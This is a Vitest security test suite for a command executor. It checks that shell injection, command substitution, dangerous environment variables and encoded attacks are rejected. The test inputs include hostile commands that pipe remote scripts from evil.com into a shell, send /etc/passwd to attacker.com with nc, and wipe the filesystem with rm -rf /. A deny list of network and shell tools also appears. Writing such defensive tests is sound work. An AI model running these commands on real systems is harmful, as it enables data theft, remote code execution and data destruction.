import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { SecureCommandExecutor } from '../../src/security/CommandExecutor.js';
import { 
  MALICIOUS_INPUTS, 
  SecurityTestEnvironment, 
  SecurityAssertions,
  PlatformUtils
} from './utils/security-test-helpers.js';

describe('Command Injection Prevention', () => {
  let executor: SecureCommandExecutor;
  let testEnv: SecurityTestEnvironment;

  beforeEach(() => {
    executor = new SecureCommandExecutor(['echo', 'ls', 'cat', 'pwd', 'chmod']);
    testEnv = new SecurityTestEnvironment();
  });

  afterEach(async () => {
    await testEnv.cleanup();
  });

  describe('Shell Metacharacter Injection Prevention', () => {
    it('should prevent semicolon command chaining', async () => {
      const maliciousInputs = [
        'test; rm -rf /',
        'test; cat /etc/passwd',
        'test; curl evil.com',
        'test; whoami > /tmp/pwned'
      ];

      for (const input of maliciousInputs) {
        await expect(
          executor.executeCommand('echo', [input])
        ).rejects.toThrow(/Dangerous characters in argument/i);
      }
    });

    it('should prevent ampersand command chaining', async () => {
      const maliciousInputs = [
        'test && malicious-command',
        'test & background-process',
        'test && curl evil.com | sh'
      ];

      for (const input of maliciousInputs) {
        await expect(
          executor.executeCommand('echo', [input])
        ).rejects.toThrow(/Dangerous characters in argument/i);
      }
    });

    it('should prevent pipe command chaining', async () => {
      const maliciousInputs = [
        'test | nc attacker.com 4444',
        'test | sh',
        'passwd | curl -X POST evil.com'
      ];

      for (const input of maliciousInputs) {
        await expect(
          executor.executeCommand('echo', [input])
        ).rejects.toThrow(/Dangerous characters in argument/i);
      }
    });

    it('should prevent logical OR command chaining', async () => {
      const maliciousInputs = [
        'test || fallback-attack',
        'false || rm -rf /',
        'test || curl evil.com/script | sh'
      ];

      for (const input of maliciousInputs) {
        await expect(
          executor.executeCommand('echo', [input])
        ).rejects.toThrow(/Dangerous characters in argument/i);
      }
    });
  });

  describe('Command Substitution Prevention', () => {
    it('should prevent backtick command substitution', async () => {
      const maliciousInputs = [
        '`whoami`',
        'test`curl evil.com`',
        '`cat /etc/passwd`',
        'file`rm -rf /`name'
      ];

      for (const input of maliciousInputs) {
        await expect(
          executor.executeCommand('echo', [input])
        ).rejects.toThrow(/Dangerous characters in argument/i);
      }
    });

    it('should prevent dollar parentheses substitution', async () => {
      const maliciousInputs = [
        '$(whoami)',
        'test$(curl evil.com)',
        '$(cat /etc/passwd)',
        'file$(rm -rf /)name'
      ];

      for (const input of maliciousInputs) {
        await expect(
          executor.executeCommand('echo', [input])
        ).rejects.toThrow(/Dangerous characters in argument/i);
      }
    });

    it('should prevent brace expansion attacks', async () => {
      const maliciousInputs = [
        '{rm,/tmp/evil}',
        'test{a,$(malicious)}',
        '{/etc/passwd,/etc/shadow}',
        'file{.txt,.sh}'
      ];

      for (const input of maliciousInputs) {
        await expect(
          executor.executeCommand('echo', [input])
        ).rejects.toThrow(/Dangerous characters in argument/i);
      }
    });
  });

  describe('Command Whitelist Enforcement', () => {
    it('should reject unauthorized commands', async () => {
      const unauthorizedCommands = [
        'rm', 'curl', 'wget', 'nc', 'netcat', 'telnet', 'ssh',
        'bash', 'sh', 'zsh', 'csh', 'tcsh', 'fish',
        'python', 'python3', 'node', 'ruby', 'perl',
        'eval', 'exec', 'system'
      ];

      for (const cmd of unauthorizedCommands) {
        await expect(
          executor.executeCommand(cmd, ['test'])
        ).rejects.toThrow(/Command not allowed/i);
      }
    });

    it('should allow only whitelisted commands', async () => {
      const allowedCommands = ['echo', 'ls', 'cat', 'pwd', 'chmod'];

      for (const cmd of allowedCommands) {
        // Should not throw for allowed commands (may fail for other reasons)
        try {
          await executor.executeCommand(cmd, ['--help']);
        } catch (error) {
          // Command execution may fail, but it shouldn't be blocked by whitelist
          expect(error).not.toMatch(/Command not allowed/i);
        }
      }
    });

    it('should prevent path-based command execution', async () => {
      const pathCommands = [
        '/bin/sh',
        '/usr/bin/curl',
        '../../../bin/rm',
        'C:\\Windows\\System32\\cmd.exe',
        './malicious-script'
      ];

      for (const cmd of pathCommands) {
        await expect(
          executor.executeCommand(cmd, ['test'])
        ).rejects.toThrow(/Command not allowed/i);
      }
    });
  });

  describe('Argument Sanitization', () => {
    it('should validate argument types', async () => {
      const invalidArgs = [
        [123],           // Number
        [true],          // Boolean
        [null],          // Null
        [undefined],     // Undefined
        [{}],           // Object
        [[]],           // Array
        [Symbol('test')] // Symbol
      ];

      for (const args of invalidArgs) {
        await expect(
          executor.executeCommand('echo', args as any)
        ).rejects.toThrow(/must be a string/i);
      }
    });

    it('should enforce argument length limits', async () => {
      const longArg = 'x'.repeat(5000);
      
      await expect(
        executor.executeCommand('echo', [longArg])
      ).rejects.toThrow(/too long/i);
    });

    it('should prevent null byte injection', async () => {
      const nullByteArgs = [
        'test\0hidden',
        'file.txt\0.exe',
        '\0/etc/passwd',
        'normal\0; malicious command'
      ];

      for (const arg of nullByteArgs) {
        await expect(
          executor.executeCommand('echo', [arg])
        ).rejects.toThrow(/dangerous characters/i);
      }
    });
  });

  describe('Environment Security', () => {
    it('should create secure environment', async () => {
      const result = await executor.executeCommand('echo', ['$HOME']);
      
      // Should not expose actual user home directory
      expect(result.stdout).not.toMatch(/\/Users\/[^\/]+/);
      expect(result.stdout).not.toMatch(/\/home\/[^\/]+/);
      expect(result.stdout).not.toMatch(/C:\\Users\\[^\\]+/);
    });

    it('should reject dangerous environment variables', async () => {
      const dangerousEnv = {
        'PATH=/tmp/malicious:$PATH': 'value',
        'LD_PRELOAD': '/tmp/malicious.so',
        'SHELL': '/bin/sh -c "curl evil.com"',
        'IFS': '$\'\\t\\n\'; rm -rf /',
        'HOME=../../../root': 'value'
      };

      for (const [key, value] of Object.entries(dangerousEnv)) {
        await expect(
          executor.executeCommand('echo', ['test'], { env: { [key]: value } })
        ).rejects.toThrow(/environment variable/i);
      }
    });

    it('should limit environment variable content', async () => {
      const longValue = 'x'.repeat(10000);
      
      await expect(
        executor.executeCommand('echo', ['test'], { 
          env: { LONG_VAR: longValue } 
        })
      ).rejects.toThrow();
    });
  });

  describe('Timeout and Resource Protection', () => {
    it('should enforce command timeouts', async () => {
      // Mock a long-running command
      const longRunningPromise = executor.executeCommand('sleep', ['60'], { 
        timeout: 100 
      });

      await expect(longRunningPromise).rejects.toThrow(/timed out/i);
    });

    it('should limit output size', async () => {
      const result = await executor.executeCommand('echo', ['test'], {
        maxOutputSize: 2
      });
      
      expect(result.stdout.length + result.stderr.length).toBeLessThanOrEqual(2);
    });

    it('should handle resource exhaustion gracefully', async () => {
      // Try to create many concurrent processes
      const operations = Array.from({ length: 50 }, () =>
        executor.executeCommand('echo', ['test'], { timeout: 1000 })
      );

      const results = await Promise.allSettled(operations);
      
      // Some may succeed, some may fail, but system should remain stable
      expect(results.length).toBe(50);
      
      // At least some should succeed
      const successful = results.filter(r => r.status === 'fulfilled');
      expect(successful.length).toBeGreaterThan(0);
    });
  });

  describe('Platform-Specific Injection Prevention', () => {
    it('should prevent platform-specific command injection', async () => {
      const platformVectors = PlatformUtils.getCommandInjectionVectors();
      
      for (const vector of platformVectors) {
        await expect(
          executor.executeCommand('echo', [vector])
        ).rejects.toThrow(/dangerous characters/i);
      }
    });

    it('should handle Windows-specific attacks', async () => {
      if (process.platform === 'win32') {
        const windowsAttacks = [
          '& del /Q /S C:\\',
          '&& powershell -c "malicious"',
          '| type C:\\Windows\\System32\\config\\SAM'
        ];

        for (const attack of windowsAttacks) {
          await expect(
            executor.executeCommand('echo', [attack])
          ).rejects.toThrow(/dangerous characters/i);
        }
      }
    });

    it('should handle Unix-specific attacks', async () => {
      if (process.platform !== 'win32') {
        const unixAttacks = [
          '; rm -rf /',
          '&& curl evil.com | bash',
          '| nc attacker.com 4444 < /etc/passwd'
        ];

        for (const attack of unixAttacks) {
          await expect(
            executor.executeCommand('echo', [attack])
          ).rejects.toThrow(/dangerous characters/i);
        }
      }
    });
  });

  describe('Security Regression Tests', () => {
    it('should maintain security after multiple operations', async () => {
      // Execute many legitimate operations first
      for (let i = 0; i < 10; i++) {
        await executor.executeCommand('echo', [`test-${i}`]);
      }

      // Security should still be enforced
      await expect(
        executor.executeCommand('echo', ['; malicious-command'])
      ).rejects.toThrow(/dangerous characters/i);
    });

    it('should not be bypassable through encoding', async () => {
      const encodedAttacks = [
        '%3B%20rm%20-rf%20%2F',           // URL encoded "; rm -rf /"
        '\\x3b\\x20rm\\x20-rf\\x20\\x2f', // Hex encoded
        String.fromCharCode(59, 32, 114, 109), // Character code injection
      ];

      for (const attack of encodedAttacks) {
        await expect(
          executor.executeCommand('echo', [attack])
        ).rejects.toThrow(/dangerous characters/i);
      }
    });
  });

  describe('Legitimate Operations', () => {
    it('should allow safe command execution', async () => {
      const result = await executor.executeCommand('echo', ['Hello, World!']);
      expect(result.stdout.trim()).toBe('Hello, World!');
      expect(result.exitCode).toBe(0);
    });

    it('should handle normal arguments correctly', async () => {
      const safeArgs = [
        'normal-file.txt',
        'file_with_underscores.log',
        'file-with-dashes.cfg',
        'file.with.dots.txt',
        '123456',
        'UPPERCASE.FILE',
        'mixed.Case.File.TXT'
      ];

      for (const arg of safeArgs) {
        const result = await executor.executeCommand('echo', [arg]);
        expect(result.stdout.trim()).toBe(arg);
        expect(result.exitCode).toBe(0);
      }
    });

    it('should handle multiple safe arguments', async () => {
      const result = await executor.executeCommand('echo', [
        'arg1', 'arg2', 'arg3'
      ]);
      
      expect(result.stdout.trim()).toBe('arg1 arg2 arg3');
      expect(result.exitCode).toBe(0);
    });

    it('should preserve argument spacing and formatting', async () => {
      const result = await executor.executeCommand('echo', [
        'text with spaces',
        'another argument'
      ]);
      
      expect(result.stdout.trim()).toBe('text with spaces another argument');
    });
  });

  describe('Error Handling', () => {
    it('should provide informative error messages', async () => {
      try {
        await executor.executeCommand('unauthorized-command', ['test']);
        fail('Should have thrown an error');
      } catch (error) {
        expect(error).toBeInstanceOf(Error);
        expect(error.message).toContain('Command not allowed');
        
        // Should not expose sensitive information
        SecurityAssertions.assertNoSensitiveInfo(error.message, 'error message');
      }
    });

    it('should handle command execution failures gracefully', async () => {
      try {
        await executor.executeCommand('ls', ['/nonexistent-directory']);
      } catch (error) {
        expect(error).toBeInstanceOf(Error);
        // Error handling should be graceful, not expose system details
        SecurityAssertions.assertNoSensitiveInfo(error.message, 'error message');
      }
    });
  });
});